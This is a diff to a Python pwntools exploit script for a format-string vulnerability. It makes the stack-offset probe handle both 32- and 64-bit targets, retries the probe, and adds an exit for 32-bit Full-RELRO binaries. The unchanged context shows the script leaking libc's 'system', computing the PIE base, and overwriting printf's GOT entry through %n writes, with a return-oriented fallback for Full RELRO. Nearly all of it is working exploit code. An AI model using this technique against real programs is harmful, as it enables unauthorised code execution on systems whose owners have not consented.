@@ -29,20 +29,49 @@ def _page_writable(pid, addr):
         pass
     return False
 
+# find the format-arg offset with a marker + %p chain. Arch-aware: on x86-64 a slot the marker
+# lands in prints as 0x4141414141414141 (8 bytes), on x86-32 as 0x41414141 (4 bytes). The probe is
+# timing-sensitive (a single recvuntil can miss the tail under load), so retry it a few times -- a
+# fresh process each try -- gathering the full line with recvrepeat before parsing.
+_marks = (b"0x4141414141414141",) if elf.bits == 64 else (b"0x41414141",)
+io = None
+offset = None
+for _attempt in range(4):
+    try:
+        if io is not None:
+            io.close()
+    except Exception:
+        pass
+    io = process([elf.path], aslr=False)
+    try:
+        io.recvuntil(prompt, timeout=2)
+    except Exception:
+        pass
+    io.sendline(b"AAAAAAAA." + b".".join(b"%%%d$p" % i for i in range(1, 41)))
+    resp = b""
+    try:
+        resp = io.recvuntil(prompt, timeout=3)
+    except Exception:
+        pass
+    resp += io.recvrepeat(0.4)                      # drain any tail the prompt-sync missed
+    for i, tok in enumerate(resp.split(b".")[1:], 1):
+        if tok.strip() in _marks:
+            offset = i; break
+    if offset is not None:
+        break
+if offset is None:
+    print("NO_OFFSET"); sys.exit(1)
+# reopen a FRESH, prompt-synced process for the exploitation phase: the probe above consumed
+# rounds / may have desynced the recv stream, which otherwise breaks the first write attempt.
+try:
+    io.close()
+except Exception:
+    pass
 io = process([elf.path], aslr=False)
 try:
     io.recvuntil(prompt, timeout=2)
 except Exception:
     pass
-# find the format-arg offset with a marker + %p chain
-io.sendline(b"AAAAAAAA." + b".".join(b"%%%d$p" % i for i in range(1, 21)))
-resp = io.recvuntil(prompt, timeout=3)
-offset = None
-for i, tok in enumerate(resp.split(b".")[1:], 1):
-    if tok.strip() == b"0x4141414141414141":
-        offset = i; break
-if offset is None:
-    print("NO_OFFSET"); sys.exit(1)
 libc = io.libc; system = libc.symbols["system"]
 pie_base = 0
 if elf.pie:
@@ -82,6 +111,12 @@ if _page_writable(io.pid, printf_got):
         try: io.recvuntil(prompt, timeout=2)
         except Exception: pass
     print("NOT_VERIFIED offset=%d" % offset)
+    sys.exit(1)
+
+# Full RELRO fallback below is x86-64-specific (u64 / pop rdi / 16B movaps alignment). On a 32-bit
+# Full-RELRO target it cannot apply, so degrade honestly rather than build a wrong chain.
+if elf.bits != 64:
+    print("NOT_VERIFIED offset=%d (Full-RELRO fallback es x86-64; 32-bit Full-RELRO no soportado)" % offset)
     sys.exit(1)
 
 # Full RELRO: printf@GOT is read-only (a %n write to it SIGSEGVs), so the GOT-overwrite technique
